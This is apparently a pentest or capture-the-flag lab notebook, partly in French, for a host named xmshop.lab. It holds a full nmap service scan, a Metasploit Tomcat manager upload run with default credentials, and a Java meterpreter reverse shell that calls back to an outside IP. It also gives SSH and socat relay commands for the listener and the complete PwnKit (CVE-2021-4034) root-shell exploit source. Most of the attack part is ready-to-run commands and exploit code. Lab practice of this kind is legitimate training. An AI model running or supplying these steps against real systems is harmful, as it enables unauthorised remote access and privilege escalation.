## NMAP

```
# Nmap 7.98 scan initiated Fri Apr 10 10:32:02 2026 as: nmap -sT -sV -Pn -T4 -p- -oA nmap-all-port.txt 18.158.110.24
Nmap scan report for xmshop.lab (18.158.110.24)
Host is up (0.010s latency).
Not shown: 65481 closed tcp ports (conn-refused)
PORT      STATE SERVICE        VERSION
21/tcp    open  ftp            vsftpd 2.3.4
22/tcp    open  ssh            OpenSSH 5.3 (protocol 2.0)
23/tcp    open  telnet         Linux telnetd
53/tcp    open  domain         ISC BIND 9.8.2rc1 (RedHat Enterprise Linux 6)
81/tcp    open  http           nginx 1.10.3
110/tcp   open  pop3           Dovecot pop3d
111/tcp   open  rpcbind        2-4 (RPC #100000)
143/tcp   open  imap           Dovecot imapd
512/tcp   open  exec?
513/tcp   open  login?
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imaps?
995/tcp   open  ssl/pop3s?
2049/tcp  open  nfs_acl        2-3 (RPC #100227)
2090/tcp  open  java-rmi       Java RMI
2098/tcp  open  java-rmi       Java RMI
2099/tcp  open  java-object    Java Object Serialization
2100/tcp  open  java-object    Java Object Serialization
2101/tcp  open  java-rmi       Java RMI
3306/tcp  open  mysql          MySQL 5.1.73
4369/tcp  open  epmd           Erlang Port Mapper Daemon
4528/tcp  open  giop
4873/tcp  open  java-object    Java Object Serialization
5432/tcp  open  postgresql     PostgreSQL DB
5444/tcp  open  java-rmi       Java RMI
5445/tcp  open  java-object    Java Object Serialization
5446/tcp  open  java-object    Java Object Serialization
5447/tcp  open  java-rmi       Java RMI
5448/tcp  open  java-object    Java Object Serialization
5457/tcp  open  tandem-print   Sharp printer tandem printing
5672/tcp  open  amqp           RabbitMQ 3.2.2 (0-9)
5712/tcp  open  msdtc          Microsoft Distributed Transaction Coordinator (error)
5713/tcp  open  proshareaudio?
5984/tcp  open  http           CouchDB httpd 1.6.1 (Erlang OTP/R14B01)
6117/tcp  open  daylitetouch?
7900/tcp  open  tcpwrapped
8009/tcp  open  ajp13          Apache Jserv (Protocol v1.3)
8080/tcp  open  http           Apache Tomcat/Coyote JSP engine 1.1
9009/tcp  open  pichat?
9080/tcp  open  http           Apache Tomcat/Coyote JSP engine 1.1
9083/tcp  open  http           JBoss service httpd
15672/tcp open  http           MochiWeb httpd
33393/tcp open  nlockmgr       1-4 (RPC #100021)
34519/tcp open  java-rmi       Java RMI
37692/tcp open  unknown
41435/tcp open  unknown
41949/tcp open  mountd         1-3 (RPC #100005)
42215/tcp open  unknown
42698/tcp open  unknown
44945/tcp open  unknown
45589/tcp open  mountd         1-3 (RPC #100005)
46182/tcp open  mountd         1-3 (RPC #100005)
55672/tcp open  http           MochiWeb Erlang HTTP library 1.0 (RabbitMQ management; redirect to port 15672)
60531/tcp open  status         1 (RPC #100024)
9 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2099-TCP:V=7.98%I=7%D=4/10%Time=69D8B61C%P=x86_64-apple-darwin23.6.
SF:0%r(NULL,1AB,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x
SF:1e\x97\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08
SF:objBytesq\0~\0\x01xp\xdb\xa9\x8c\xd4ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08
SF:T\xe0\x02\0\0xp\0\0\0L\xac\xed\0\x05t\0;http://ip-172-31-43-145\.eu-cen
SF:tral-1\.compute\.internal:9083/q\0~\0\0q\0~\0\0uq\0~\0\x03\0\0\0\xe5\xa
SF:c\xed\0\x05sr\0\x20org\.jnp\.server\.NamingServer_Stub\0\0\0\0\0\0\0\x0
SF:2\x02\0\0xr\0\x1ajava\.rmi\.server\.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e
SF:\x1a\x02\0\0xr\0\x1cjava\.rmi\.server\.RemoteObject\xd3a\xb4\x91\x0ca3\
SF:x1e\x03\0\0xpwY\0\x0bUnicastRef2\0\0\.ip-172-31-43-145\.eu-central-1\.c
SF:ompute\.internal\0\0\x082\xbe=\x1b\xbe'S\xe7\xa0ba\x1a\xd5\0\0\x01\x9dv
SF:\x17\xf9\xfb\x80\x01\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2100-TCP:V=7.98%I=7%D=4/10%Time=69D8B61C%P=x86_64-apple-darwin23.6.
SF:0%r(NULL,401,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x
SF:1e\x97\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08
SF:objBytesq\0~\0\x01xpx\"\xbd\x16ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0
SF:\x02\0\0xp\0\0\0e\xac\xed\0\x05t\0;http://ip-172-31-43-145\.eu-central-
SF:1\.compute\.internal:9083/q\0~\0\0q\0~\0\0q\0~\0\0q\0~\0\0q\0~\0\0q\0~\
SF:0\0q\0~\0\0uq\0~\0\x03\0\0\x03\"\xac\xed\0\x05s}\0\0\0\x02\0\x19org\.jn
SF:p\.interfaces\.Naming\0,org\.jboss\.ha\.framework\.interfaces\.HARMIPro
SF:xyxr\0\x17java\.lang\.reflect\.Proxy\xe1'\xda\x20\xcc\x10C\xcb\x02\0\x0
SF:1L\0\x01ht\0%Ljava/lang/reflect/InvocationHandler;xpsr\0-org\.jboss\.ha
SF:\.framework\.interfaces\.HARMIClient\xee\xf5\xebj\xfb\xb5\xd9\x91\x03\0
SF:\x03L\0\x11familyClusterInfot\x005Lorg/jboss/ha/framework/interfaces/Fa
SF:milyClusterInfo;L\0\x03keyt\0\x12Ljava/lang/String;L\0\x11loadBalancePo
SF:licyt\x003Lorg/jboss/ha/client/loadbalance/LoadBalancePolicy;xpw\x19\0\
SF:x17DefaultPartition/HAJNDIsr\0\x13java\.util\.ArrayListx\x81\xd2\x1d\x9
SF:9\xc7a\x9d\x03\0\x01I\0\x04sizexp\0\0\0\x01w\x04\0\0\0\x01sr\x002org\.j
SF:boss\.ha\.framework\.server\.HARMIServerImpl_Stub\0\0\0\0\0\0\0\x02\x02
SF:\0\0xr\0\x1ajava\.rmi\.server\.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\
SF:x02\0\0xr\0\x1cjava\.rmi\.server\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x
SF:03\0\0xpwY\0\x0bUnicastRef2\0\0\.ip-172-31-43-145\.eu-ce");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4528-TCP:V=7.98%I=7%D=4/10%Time=69D8B643%P=x86_64-apple-darwin23.6.
SF:0%r(giop,4C,"GIOP\x01\0\0\x01\0\0\0@\0\0\0\0\0\0\0\x01\0\0\0\x02\0\0\0'
SF:IDL:omg\.org/CORBA/OBJECT_NOT_EXIST:1\.0\0\0\0\0\0\0\0\0\0\x01");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4873-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
SF:0%r(NULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5432-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
SF:0%r(SMBProgNeg,97,"E\0\0\0\x96SFATAL\0C0A000\0MProtocole\x20non\x20supp
SF:ort\xc3\xa9e\x20de\x20l'interface\x2065363\.19778\x20:\x20le\x20serveur
SF:\x20supporte\x20de\x201\.0\x20\xc3\xa0\n3\.0\0Fpostmaster\.c\0L1624\0RP
SF:rocessStartupPacket\0\0")%r(Kerberos,97,"E\0\0\0\x96SFATAL\0C0A000\0MPr
SF:otocole\x20non\x20support\xc3\xa9e\x20de\x20l'interface\x2027265\.28208
SF:\x20:\x20le\x20serveur\x20supporte\x20de\x201\.0\x20\xc3\xa0\n3\.0\0Fpo
SF:stmaster\.c\0L1624\0RProcessStartupPacket\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5445-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
SF:0%r(NULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5446-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
SF:0%r(NULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5448-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
SF:0%r(NULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5713-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
SF:0%r(NULL,5,"a42d\n")%r(GenericLines,5,"a42d\n")%r(GetRequest,5,"a42d\n"
SF:)%r(HTTPOptions,5,"a42d\n")%r(RTSPRequest,5,"a42d\n")%r(RPCCheck,5,"a42
SF:d\n")%r(DNSVersionBindReqTCP,5,"a42d\n")%r(DNSStatusRequestTCP,5,"a42d\
SF:n")%r(Help,5,"a42d\n")%r(SSLSessionReq,5,"a42d\n")%r(TerminalServerCook
SF:ie,5,"a42d\n")%r(TLSSessionReq,5,"a42d\n")%r(Kerberos,5,"a42d\n")%r(SMB
SF:ProgNeg,5,"a42d\n")%r(X11Probe,5,"a42d\n")%r(FourOhFourRequest,5,"a42d\
SF:n")%r(LPDString,5,"a42d\n")%r(LDAPSearchReq,5,"a42d\n")%r(LDAPBindReq,5
SF:,"a42d\n")%r(SIPOptions,5,"a42d\n")%r(LANDesk-RC,5,"a42d\n")%r(Terminal
SF:Server,5,"a42d\n")%r(NCP,5,"a42d\n")%r(NotesRPC,5,"a42d\n")%r(JavaRMI,5
SF:,"a42d\n")%r(WMSRequest,5,"a42d\n")%r(oracle-tns,5,"a42d\n")%r(ms-sql-s
SF:,5,"a42d\n")%r(afp,5,"a42d\n")%r(giop,5,"a42d\n");
Service Info: OSs: Unix, Linux, Windows; Device: printer; CPE: cpe:/o:linux:linux_kernel, cpe:/o:redhat:enterprise_linux:6, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 10 10:37:22 2026 -- 1 IP address (1 host up) scanned in 320.37 seconds
```


```
18.158.110.24
```

## Port 8080

### [Tomcat RCE](https://github.com/psmiraglia/ctf/blob/master/kevgir/001-tomcat.md)

```
tomcat:password
```

Sur exegol:

```
use exploit/multi/http/tomcat_mgr_upload

set RHOSTS 18.158.110.24
set RPORT 8080

set HttpUsername tomcat
set HttpPassword password

set payload java/meterpreter/reverse_tcp

set LPORT 6667
set ReverseListenerBindAddress 0.0.0.0  
set LHOST 212.129.9.19

exploit
```

```
use exploit/multi/handler  
set payload java/meterpreter/reverse_tcp  
set LHOST 0.0.0.0  
set LPORT 4444  
run
```

Sur pentest echo:

```
ssh -R 6666:127.0.0.1:4444 echo
socat TCP-LISTEN:6667,fork TCP:127.0.0.1:6666
neo iptables open 6667
```

![[Pasted image 20260410145621.png]]

### [Privesc SUID pkexec](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c)

```c
/*
 * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
 * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell =
	"#include <stdio.h>\n"
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n\n"
	"void gconv() {}\n"
	"void gconv_init() {\n"
	"	setuid(0); setgid(0);\n"
	"	seteuid(0); setegid(0);\n"
	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
	"	exit(0);\n"
	"}";

int main(int argc, char *argv[]) {
	FILE *fp;
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	fp = fopen("pwnkit/pwnkit.c", "w");
	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

meterpreter 

```
upload /workspace/pentest-linux/pwnkit.c /tmp/pwnkit.c
gcc pwnkit.c -o poc
./poc
```

![[Pasted image 20260410151752.png]]

